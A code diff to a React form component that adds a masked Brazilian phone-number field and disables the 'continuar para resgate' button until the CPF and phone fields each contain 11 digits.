@@ -13,6 +13,7 @@ const Index = () => {
   const [processingOpen, setProcessingOpen] = useState(false);
   const [toggleOn, setToggleOn] = useState(false);
   const [cpf, setCpf] = useState("");
+  const [telefone, setTelefone] = useState("");
   const [nomeCompleto, setNomeCompleto] = useState("");
   const [consultando, setConsultando] = useState(false);
 
@@ -60,6 +61,13 @@ const Index = () => {
           <label className="text-sm text-primary-foreground/80 block mb-1">Telefone</label>
           <input
             type="tel"
+            value={telefone}
+            onChange={(e) => {
+              let v = e.target.value.replace(/\D/g, "").slice(0, 11);
+              if (v.length > 6) v = v.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3");
+              else if (v.length > 2) v = v.replace(/(\d{2})(\d{0,5})/, "($1) $2");
+              setTelefone(v);
+            }}
             className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/30 pb-2 outline-none text-base placeholder:text-primary-foreground/40"
             placeholder="(00) 00000-0000"
           />
@@ -106,7 +114,8 @@ const Index = () => {
         {/* CTA */}
         <button
           onClick={() => setProcessingOpen(true)}
-          className="w-full py-4 rounded-full bg-white text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity"
+          disabled={cpf.replace(/\D/g, "").length !== 11 || telefone.replace(/\D/g, "").length !== 11}
+          className="w-full py-4 rounded-full bg-white text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
         >
           continuar para resgate
         </button>
